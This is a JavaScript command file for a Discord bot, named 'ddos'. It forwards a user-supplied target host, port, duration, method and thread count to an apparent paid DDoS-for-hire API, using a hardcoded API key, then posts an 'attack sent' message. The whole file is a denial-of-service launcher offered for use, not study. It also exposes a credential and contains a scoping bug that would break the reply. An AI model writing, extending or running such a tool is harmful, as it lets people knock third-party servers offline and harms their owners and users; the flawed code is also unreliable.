module.exports = {
    name: 'ddos',
    description: "this is a ddos command",
    execute(message, args, Discord) {
        {
            const newEmbed = new Discord.MessageEmbed()
            .setColor('BLACK')
            .setTitle('')
            .setURL('')
            .setDescription(`
            [API LOGS]
            Request was taken in under **10000**ms
            Attack sent with normal power
            APIv4 SYSTEM (**Paid**)
            [API LOGS]`)
            .setTimestamp()
            .setFooter('Not all added yet | Testing');
        }
      const Commando = require('discord.js-commando')
      const axios = require('axios')
      {
        axios
        .get(
          "https://api.primitive-api.cc/api.php?key=C1uXrKpSGm9xdOjA&host=" +
            args[1] +
            "&port=" +
            args[2] +
            "&time=" +
            args[3] +
            "&method=" +
            args[4] +
            "&threads=" +
            args[5] +
            "&pps="
        )
      }

        message.channel.send(newEmbed);
    }
}